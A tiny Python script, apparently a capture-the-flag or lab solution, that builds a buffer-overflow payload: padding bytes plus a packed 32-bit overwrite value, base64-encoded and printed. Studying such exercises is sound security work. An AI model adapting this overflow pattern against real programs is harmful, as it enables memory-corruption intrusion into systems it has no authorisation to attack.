
import sys
import struct
import base64

buf = b'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz'
buf += struct.pack('<I', 2953834048)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
